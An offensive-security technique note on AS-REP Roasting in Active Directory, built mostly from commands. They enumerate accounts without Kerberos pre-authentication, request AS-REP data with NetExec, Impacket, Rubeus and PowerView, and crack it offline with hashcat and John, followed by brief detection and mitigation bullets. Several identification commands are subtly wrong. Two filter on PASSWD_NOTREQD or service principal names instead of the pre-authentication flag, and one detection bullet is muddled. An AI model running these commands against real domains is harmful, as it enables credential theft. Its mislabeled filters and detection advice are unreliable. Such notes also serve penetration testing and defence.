---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1558.004"
  - "#stage/initial-access"
  - "#protocol/kerberos"
  - "#os/windows"
  - "#tool/impacket"
  - "#tool/rubeus"
  - "#tool/nxc"
  - "#tool/hashcat"
aliases:
  - AS-REP Roasting
  - Kerberos Pre-Authentication Attack
  - ASREPRoast
---

## Technique
___

ASREPRoast targets user accounts that have the "Do not require Kerberos pre-authentication" setting enabled. This configuration allows an attacker to request authentication data for these users without providing any credentials. The resulting data can be subjected to offline cracking to reveal the user's password.

When Kerberos pre-authentication is disabled, the Authentication Server (AS) responds with an AS-REP message that contains data encrypted with the user's password-derived key. This response can be requested without authentication and then subjected to offline password cracking.

## Prerequisites
___

**Access Level:** No authentication required (can be performed anonymously)

**System State:** The target Active Directory domain must have users with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag set)

**Information:** Knowledge of valid usernames in the domain or ability to enumerate them

## Identification
___

### Remote Identification (Unauthenticated)

Using NetExec (NXC):
```bash
nxc ldap <IP> -u '' -p '' --query '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' ""
```

### Local Identification (Authenticated)

Using ADSearch:
```powershell
ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```

Using built-in Windows tools:
```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Using PowerView:
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Execution
___

### Request AS-REP Tickets

#### Remote Execution

Using NetExec:
```bash
nxc ldap <IP> -u '<USER>' -p '' --asreproast output.txt
```

Using Impacket:
```bash
impacket-GetNPUsers domain.local/svc-test -no-pass
```

#### Local Execution

Using Rubeus:
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:svc-test /nowrap
```

Using PowerView:
```powershell
Get-ASREPHash -Username svc-test -verbose
```

### Crack the Tickets

Using Hashcat:
```bash
hashcat -m 18200 --force -a 0 hashes.txt <wordlist>
```

Using John the Ripper:
```bash
john --wordlist=<wordlist> hashes.txt
```

## Detection & Mitigation
___

### Detection

- Monitor for AS-REP requests that don't have corresponding AS-REQ messages
- Watch for account enumeration attempts against your domain controllers
- Look for multiple failed Kerberos authentication attempts from a single source

### Mitigation

- Ensure Kerberos pre-authentication is enabled for all user accounts (this is the default setting)
- Regularly audit user account properties for the DONT_REQ_PREAUTH flag
- Implement strong password policies to make offline cracking difficult
- Use a Group Policy Object to enforce Kerberos pre-authentication for all accounts
- Monitor and restrict anonymous LDAP queries in your environment